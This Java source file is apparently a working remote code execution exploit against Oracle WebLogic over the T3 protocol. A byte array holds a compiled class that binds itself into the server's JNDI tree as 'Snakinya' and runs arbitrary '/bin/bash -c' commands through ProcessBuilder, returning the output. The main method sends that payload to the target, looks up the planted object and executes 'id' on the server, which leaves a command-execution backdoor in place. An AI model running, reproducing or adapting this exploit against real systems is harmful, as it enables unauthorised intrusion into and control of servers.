package com.snakinya.exp;

import com.snakinya.payload.Echo;
import com.snakinya.t3impl.WeblogicTrustManager;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;

import javax.naming.Context;

import static com.snakinya.t3impl.t3impl.t3Send;

public class Echoexp {
    private static String host = "127.0.0.1";
    private static String port = "7001";
    private static final String classname = "com.snakinya.t3impl.RemoteImpl";
    private static final byte[] bs = new byte[]{
            -54,-2,-70,-66,0,0,0,51,0,-125,7,0,2,1,0,30,99,111,109,47,115,110,97,107,105,110,121,97,47,116,51,105,109,112,108,47,82,101,109,111,116,101,73,109,112,108,7,0,4,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,7,0,6,1,0,46,119,101,98,108,111,103,105,99,47,99,108,117,115,116,101,114,47,115,105,110,103,108,101,116,111,110,47,67,108,117,115,116,101,114,77,97,115,116,101,114,82,101,109,111,116,101,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,10,0,3,0,11,12,0,7,0,8,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,32,76,99,111,109,47,115,110,97,107,105,110,121,97,47,116,51,105,109,112,108,47,82,101,109,111,116,101,73,109,112,108,59,1,0,4,109,97,105,110,1,0,22,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,10,0,1,0,11,7,0,20,1,0,27,106,97,118,97,120,47,110,97,109,105,110,103,47,73,110,105,116,105,97,108,67,111,110,116,101,120,116,10,0,19,0,11,8,0,23,1,0,8,83,110,97,107,105,110,121,97,11,0,25,0,27,7,0,26,1,0,20,106,97,118,97,120,47,110,97,109,105,110,103,47,67,111,110,116,101,120,116,12,0,28,0,29,1,0,6,114,101,98,105,110,100,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,86,10,0,31,0,33,7,0,32,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,12,0,34,0,8,1,0,15,112,114,105,110,116,83,116,97,99,107,84,114,97,99,101,1,0,4,97,114,103,115,1,0,19,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,6,114,101,109,111,116,101,1,0,7,99,111,110,116,101,120,116,1,0,22,76,106,97,118,97,120,47,110,97,109,105,110,103,47,67,111,110,116,101,120,116,59,1,0,1,101,1,0,21,76,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,59,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,7,0,36,1,0,17,115,101,116,83,101,114,118,101,114,76,111,99,97,116,105,111,110,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,10,69,120,99,101,112,116,105,111,110,115,7,0,48,1,0,24,106,97,118,97,47,114,109,105,47,82,101,109,111,116,101,69,120,99,101,112,116,105,111,110,1,0,3,99,109,100,1,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,17,103,101,116,83,101,114,118,101,114,76,111,99,97,116,105,111,110,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,7,0,54,1,0,19,106,97,118,97,47,117,116,105,108,47,65,114,114,97,121,76,105,115,116,10,0,53,0,11,8,0,57,1,0,9,47,98,105,110,47,98,97,115,104,11,0,59,0,61,7,0,60,1,0,14,106,97,118,97,47,117,116,105,108,47,76,105,115,116,12,0,62,0,63,1,0,3,97,100,100,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,90,8,0,65,1,0,2,45,99,7,0,67,1,0,24,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,66,117,105,108,100,101,114,10,0,66,0,69,12,0,7,0,70,1,0,19,40,76,106,97,118,97,47,117,116,105,108,47,76,105,115,116,59,41,86,10,0,66,0,72,12,0,73,0,74,1,0,19,114,101,100,105,114,101,99,116,69,114,114,111,114,83,116,114,101,97,109,1,0,29,40,90,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,66,117,105,108,100,101,114,59,10,0,66,0,76,12,0,77,0,78,1,0,5,115,116,97,114,116,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,7,0,80,1,0,22,106,97,118,97,47,105,111,47,66,117,102,102,101,114,101,100,82,101,97,100,101,114,7,0,82,1,0,25,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,82,101,97,100,101,114,10,0,84,0,86,7,0,85,1,0,17,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,12,0,87,0,88,1,0,14,103,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,23,40,41,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,10,0,81,0,90,12,0,7,0,91,1,0,24,40,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,41,86,10,0,79,0,93,12,0,7,0,94,1,0,19,40,76,106,97,118,97,47,105,111,47,82,101,97,100,101,114,59,41,86,7,0,96,1,0,22,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,10,0,95,0,11,10,0,95,0,99,12,0,100,0,101,1,0,6,97,112,112,101,110,100,1,0,44,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,8,0,103,1,0,1,10,10,0,79,0,105,12,0,106,0,107,1,0,8,114,101,97,100,76,105,110,101,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,10,0,95,0,109,12,0,110,0,107,1,0,8,116,111,83,116,114,105,110,103,10,0,31,0,112,12,0,113,0,107,1,0,10,103,101,116,77,101,115,115,97,103,101,1,0,4,99,109,100,115,1,0,16,76,106,97,118,97,47,117,116,105,108,47,76,105,115,116,59,1,0,14,112,114,111,99,101,115,115,66,117,105,108,100,101,114,1,0,26,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,66,117,105,108,100,101,114,59,1,0,4,112,114,111,99,1,0,19,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,1,0,2,98,114,1,0,24,76,106,97,118,97,47,105,111,47,66,117,102,102,101,114,101,100,82,101,97,100,101,114,59,1,0,2,115,98,1,0,24,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,4,108,105,110,101,1,0,22,76,111,99,97,108,86,97,114,105,97,98,108,101,84,121,112,101,84,97,98,108,101,1,0,36,76,106,97,118,97,47,117,116,105,108,47,76,105,115,116,60,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,62,59,7,0,-128,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,15,82,101,109,111,116,101,73,109,112,108,46,106,97,118,97,0,33,0,1,0,3,0,1,0,5,0,0,0,4,0,1,0,7,0,8,0,1,0,9,0,0,0,47,0,1,0,1,0,0,0,5,42,-73,0,10,-79,0,0,0,2,0,12,0,0,0,6,0,1,0,0,0,13,0,13,0,0,0,12,0,1,0,0,0,5,0,14,0,15,0,0,0,9,0,16,0,17,0,1,0,9,0,0,0,-97,0,3,0,3,0,0,0,34,-69,0,1,89,-73,0,18,76,-69,0,19,89,-73,0,21,77,44,18,22,43,-71,0,24,3,0,-89,0,8,77,44,-74,0,30,-79,0,1,0,8,0,25,0,28,0,31,0,3,0,12,0,0,0,26,0,6,0,0,0,16,0,8,0,18,0,16,0,19,0,25,0,20,0,29,0,21,0,33,0,23,0,13,0,0,0,42,0,4,0,0,0,34,0,35,0,36,0,0,0,8,0,26,0,37,0,15,0,1,0,16,0,9,0,38,0,39,0,2,0,29,0,4,0,40,0,41,0,2,0,42,0,0,0,19,0,2,-1,0,28,0,2,7,0,43,7,0,1,0,1,7,0,31,4,0,1,0,44,0,45,0,2,0,46,0,0,0,4,0,1,0,47,0,9,0,0,0,63,0,0,0,3,0,0,0,1,-79,0,0,0,2,0,12,0,0,0,6,0,1,0,0,0,29,0,13,0,0,0,32,0,3,0,0,0,1,0,14,0,15,0,0,0,0,0,1,0,49,0,50,0,1,0,0,0,1,0,35,0,50,0,2,0,1,0,51,0,52,0,2,0,46,0,0,0,4,0,1,0,47,0,9,0,0,1,-116,0,5,0,8,0,0,0,124,-69,0,53,89,-73,0,55,77,44,18,56,-71,0,58,2,0,87,44,18,64,-71,0,58,2,0,87,44,43,-71,0,58,2,0,87,-69,0,66,89,44,-73,0,68,78,45,4,-74,0,71,87,45,-74,0,75,58,4,-69,0,79,89,-69,0,81,89,25,4,-74,0,83,-73,0,89,-73,0,92,58,5,-69,0,95,89,-73,0,97,58,6,-89,0,16,25,6,25,7,-74,0,98,18,102,-74,0,98,87,25,5,-74,0,104,89,58,7,-57,-1,-21,25,6,-74,0,108,-80,77,44,-74,0,111,-80,0,1,0,0,0,117,0,118,0,31,0,4,0,12,0,0,0,62,0,15,0,0,0,36,0,8,0,38,0,17,0,39,0,26,0,40,0,34,0,42,0,43,0,43,0,49,0,44,0,55,0,46,0,76,0,47,0,85,0,50,0,88,0,51,0,101,0,50,0,112,0,54,0,118,0,55,0,119,0,56,0,13,0,0,0,102,0,10,0,0,0,124,0,14,0,15,0,0,0,0,0,124,0,49,0,50,0,1,0,8,0,110,0,114,0,115,0,2,0,43,0,75,0,116,0,117,0,3,0,55,0,63,0,118,0,119,0,4,0,76,0,42,0,120,0,121,0,5,0,85,0,33,0,122,0,123,0,6,0,88,0,13,0,124,0,50,0,7,0,109,0,9,0,124,0,50,0,7,0,119,0,5,0,40,0,41,0,2,0,125,0,0,0,12,0,1,0,8,0,110,0,114,0,126,0,2,0,42,0,0,0,52,0,3,-1,0,88,0,8,7,0,1,7,0,127,7,0,59,7,0,66,7,0,84,7,0,79,7,0,95,7,0,127,0,0,-6,0,12,-1,0,16,0,2,7,0,1,7,0,127,0,1,7,0,31,0,1,0,-127,0,0,0,2,0,-126,
    };

    public static void main(String[] args) {
        try {
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            byte[] payload = Echo.executeCmd(classname,bs);
            t3Send(host, port, payload);

            Environment environment = new Environment();
            environment.setProviderUrl(url);
            environment.setEnableServerAffinity(false);
            environment.setSSLClientTrustManager(new WeblogicTrustManager());
            Context context = environment.getInitialContext();
            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Snakinya");

            // 调用RMI实例执行命令
            String res = remote.getServerLocation("id");
            System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


}

